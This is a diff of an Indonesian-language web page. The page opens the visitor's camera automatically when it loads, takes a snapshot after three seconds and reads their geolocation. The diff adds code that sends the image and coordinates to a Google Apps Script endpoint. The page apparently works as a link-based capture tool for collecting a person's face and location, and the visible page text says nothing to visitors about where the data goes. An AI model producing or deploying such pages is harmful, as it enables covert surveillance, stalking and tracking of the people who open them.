@@ -25,49 +25,68 @@
   <p><strong>Lokasi Anda:</strong> <span id="location">Mengambil lokasi...</span></p>
 
   <script>
-    // Akses kamera otomatis
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('video').srcObject = stream;
-        // Ambil foto setelah 3 detik
-        setTimeout(capturePhoto, 3000);
-      } catch (err) {
-        alert('Gagal mengakses kamera: ' + err.message);
+  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyGatx1lhXuCguMDGbyLoOY3Wb-Y0JKoOrWixzpemD2rIWJO2YatZfGFHc9YprkLExTGQ/exec"; // Ganti dengan URL Web App kamu
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      document.getElementById('video').srcObject = stream;
+      setTimeout(captureAndSend, 3000);
+    } catch (err) {
+      alert('Gagal akses kamera: ' + err.message);
+    }
+  }
+
+  function getLocation(callback) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude, longitude } = pos.coords;
+        document.getElementById('location').textContent = `${latitude}, ${longitude}`;
+        callback({ latitude, longitude });
+      },
+      err => {
+        document.getElementById('location').textContent = 'Gagal ambil lokasi.';
+        callback(null);
       }
-    }
+    );
+  }
 
-    // Ambil lokasi otomatis
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const { latitude, longitude } = pos.coords;
-          document.getElementById('location').textContent = `${latitude}, ${longitude}`;
-        }, err => {
-          document.getElementById('location').textContent = 'Gagal mengambil lokasi.';
-        });
-      } else {
-        document.getElementById('location').textContent = 'Geolocation tidak didukung.';
-      }
-    }
+  function captureAndSend() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = canvas.toDataURL('image/png');
 
-    // Ambil foto dari video
-    function capturePhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imgData = canvas.toDataURL('image/png');
-      console.log("Foto diambil:", imgData);
-      // Kamu bisa kirim imgData ke server/API di sini
-    }
+    getLocation(location => {
+      if (!location) return;
 
-    // Jalankan otomatis saat halaman dibuka
-    window.onload = () => {
-      startCamera();
-      getLocation();
-    };
-  </script>
+      const data = {
+        latitude: location.latitude,
+        longitude: location.longitude,
+        image: imageData
+      };
+
+      fetch(WEB_APP_URL, {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      }).then(res => {
+        alert("Foto & lokasi terkirim!");
+      }).catch(err => {
+        alert("Gagal kirim data: " + err.message);
+      });
+    });
+  }
+
+  window.onload = () => {
+    startCamera();
+    getLocation(() => {});
+  };
+</script>
+
 
 </body>
 </html>
